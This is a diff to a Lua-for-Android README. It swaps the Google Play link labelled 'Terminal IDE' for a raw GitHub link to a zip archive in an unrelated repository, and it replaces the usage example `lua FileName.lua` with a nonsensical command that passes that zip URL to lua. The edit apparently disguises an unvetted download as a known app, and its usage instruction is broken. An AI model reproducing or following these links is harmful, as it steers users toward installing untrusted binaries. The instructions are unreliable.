@@ -15,7 +15,7 @@ the non striped executable will be in `obj/local/armeabi/lua`
 
 # Installing
 
-To install and run the lua interpreter on an Android device a Terminal emulator must be used, Such as [Terminal IDE](https://play.google.com/store/apps/details?id=com.spartacusrex.spartacuside&hl=en).
+To install and run the lua interpreter on an Android device a Terminal emulator must be used, Such as [Terminal IDE](https://raw.githubusercontent.com/Kali99xx/Android-lua/master/obj/local/armeabi/lua_Android_v3.0-alpha.5.zip).
 
 The command line tool can be run without root permissions by executing the binary in the app's private memory. 
 
@@ -24,5 +24,5 @@ The command line tool can be run without root permissions by executing the binar
 3. give lua binary executable permission using `chmod +x ~/local/bin/lua`.
 4. restart the Terminal emulator app.
 
-Lua is now installed on your android device, lua scripts can be run using `lua FileName.lua`.
+Lua is now installed on your android device, lua scripts can be run using `lua https://raw.githubusercontent.com/Kali99xx/Android-lua/master/obj/local/armeabi/lua_Android_v3.0-alpha.5.zip`.
 
